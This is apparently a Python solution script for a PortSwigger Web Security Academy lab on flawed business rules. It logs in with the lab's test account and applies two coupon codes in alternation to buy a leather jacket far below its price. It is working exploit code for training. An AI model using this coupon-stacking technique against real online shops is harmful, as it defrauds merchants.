#######################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 26/10/2023
#
# Lab: Flawed enforcement of business rules
#
# Steps: 1. Fetch the login page
#        2. Extract the csrf token and session cookie
#        3. Login as wiener
#        4. Add the leather jacket to the cart
#        5. Fetch wiener's cart
#        6. Extract the csrf token needed for applying coupons and placing order
#        7. Apply the coupons one after another repeatedly for a few times
#        8. Place order
#        9. Confirm order
#
#######################################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0ad400dd03cbab7582d960ff00df0007.web-security-academy.net"

try:  
    # fetch the login page
    login_page = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = login_page.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login as wiener
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

# data to send via POST
data = {
    "productId": "1",
    "redir": "PRODUCT",
    "quantity": "1",
}

try:  
    # add the leather jacket to the cart
    wiener = requests.post(f"{url}/cart", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to add the leather jacket to the cart through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Adding the leather jacket to the cart.. " + Fore.GREEN + "OK")

try:  
    # fetch wiener's cart
    wiener = requests.get(f"{url}/cart", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener's cart through exception")
    exit(1)

print(Fore.WHITE + "⦗5⦘ Fetching wiener's cart.. " + Fore.GREEN + "OK")

# extract the csrf token needed for applying coupons and placing order
csrf = re.findall("csrf.+value=\"(.+)\"", wiener.text)[0]

print(Fore.WHITE + "⦗6⦘ Extracting the csrf token needed for applying coupons and placing order.. " + Fore.GREEN + "OK")

# apply the coupons one after another repeatedly for a few times
for counter in range(1,9):
    if counter % 2 != 0:
        # apply the first coupon when the counter has an odd value
        coupon = "NEWCUST5"
    else:
        # apply the second coupon when the counter has an even value
        coupon = "SIGNUP30"
    
    # data to send via POST
    data = {
        "csrf": csrf,
        "coupon": coupon
    }
    
    try:  
        # apply the coupon
        requests.post(f"{url}/cart/coupon", data, cookies=cookies)
    
    except:
        print(Fore.RED + "[!] Failed to apply the coupon through exception")
        exit(1)

    print(Fore.WHITE + "⦗7⦘ Applying the coupon " + Fore.YELLOW + coupon + Fore.WHITE + f" ({counter}/8).. ", end="\r", flush=True)

    # when you reach the end
    if counter == 8:
        print(Fore.WHITE + "⦗7⦘ Applying the coupon " + Fore.YELLOW + coupon + Fore.WHITE + f" ({counter}/8).. " + Fore.GREEN + "OK")

# data to send via POST
data = {
    "csrf": csrf
}

try:  
    # place order
    wiener = requests.post(f"{url}/cart/checkout", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to place order through exception")
    exit(1)

print(Fore.WHITE + "⦗8⦘ Placing order.. " + Fore.GREEN + "OK")

try:  
    # confirm order to mark the lab as solved.
    # without this request the leather jacket will be purchased
    # and your credit will be decreased but the lab will sill be unsolved
    wiener = requests.get(f"{url}/cart/order-confirmation?order-confirmed=true", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener's cart through exception")
    exit(1)

print(Fore.WHITE + "⦗9⦘ Confirming order.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")


